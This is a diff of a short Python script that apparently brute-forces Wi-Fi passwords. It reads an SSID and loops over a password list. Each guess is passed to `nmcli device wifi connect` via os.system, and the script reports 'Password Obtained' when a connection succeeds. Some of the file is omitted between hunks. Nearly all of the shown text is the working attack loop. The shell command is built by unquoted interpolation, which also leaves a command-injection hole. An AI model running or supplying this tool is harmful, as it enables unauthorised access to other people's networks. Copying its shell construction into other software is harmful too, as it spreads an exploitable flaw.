@@ -1,17 +1,13 @@
 #!/usr/bin/python3
 
 import sys
-
-
-
-
 import os
 import time
 
 flag = False
 
-print("___ Enter the user name ___ \n")
-U_name = input("username:")
+print("___ Enter the SSID ___ \n")
+ssid = input("SSID:")
 
 
 def pas():
@@ -50,11 +46,11 @@ for pswd in pswd_lst:
         continue
 
     try:
-	    cmd = stm + " " + U_name + " " + "password" + " " +  " \"" + pswd + "\""
-	    
+	    cmd = (f"nmcli device wifi connect {ssid} password {pswd}")
 	    print("trying : " + pswd)
-	    
 	    result = os.system(cmd)
+	    
+	    time.sleep(2)
 	    
 	    if (result == 0):
 	        print(f"Password Obtained {pswd}")
